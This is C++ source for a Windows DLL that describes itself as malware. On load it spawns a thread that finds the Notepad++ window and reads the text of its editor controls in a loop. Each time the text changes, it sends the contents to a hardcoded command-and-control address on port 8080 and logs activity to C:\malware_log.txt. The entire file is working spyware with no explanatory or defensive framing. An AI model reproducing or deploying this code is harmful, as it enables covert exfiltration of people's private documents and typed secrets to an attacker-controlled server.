#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

void WriteLog(const std::string& msg) {
    FILE* f = fopen("C:\\malware_log.txt", "a");
    if (f) {
        fprintf(f, "%s\n", msg.c_str());
        fclose(f);
    }
}

bool SendDataToC2(const std::string& data) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080);
    inet_pton(AF_INET, "192.168.162.101", &serverAddr.sin_addr);

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return false;
    }

    send(sock, data.c_str(), data.size(), 0);

    closesocket(sock);
    WSACleanup();
    return true;
}

std::vector<std::string> childTexts;
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    char className[256];
    GetClassNameA(hwnd, className, sizeof(className));
    // Kiểm tra cả "Scintilla" và "Scintilla5"
    if (strcmp(className, "Scintilla") == 0 || strcmp(className, "Scintilla5") == 0) {
        int length = SendMessageA(hwnd, WM_GETTEXTLENGTH, 0, 0);
        if (length > 0) {
            std::vector<char> buffer(length + 1);
            SendMessageA(hwnd, WM_GETTEXT, (WPARAM)buffer.size(), (LPARAM)buffer.data());
            childTexts.push_back(std::string(buffer.data()));
        }
    }
    return TRUE;
}

DWORD WINAPI ThreadFunc(LPVOID lpParam) {
    WriteLog("Thread started");
    SendDataToC2("Malware thread started!");

    Sleep(1000);
    HWND hwnd = NULL;
    EnumWindows([](HWND h, LPARAM lParam) -> BOOL {
        wchar_t cls[256];
        GetClassNameW(h, cls, 256);
        if (wcscmp(cls, L"Notepad++") == 0) {
            *(HWND*)lParam = h;
            return FALSE;
        }
        return TRUE;
        }, (LPARAM)&hwnd);

    if (!hwnd) {
        WriteLog("Notepad++ not found!");
        SendDataToC2("Notepad++ not found!");
        return 0;
    }

    WriteLog("Notepad++ found!");
    SendDataToC2("Notepad++ found!");

    std::string previousText;
    while (true) {
        childTexts.clear();
        EnumChildWindows(hwnd, EnumChildProc, 0);

        std::string allText;
        for (const auto& t : childTexts) {
            allText += t + "\n---\n";
        }

        if (allText != previousText) {
            WriteLog("Text changed, sending...");
            SendDataToC2(allText.empty() ? "No text" : allText);
            previousText = allText;
        }

        Sleep(2000);
    }

    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
    }
    return TRUE;
}
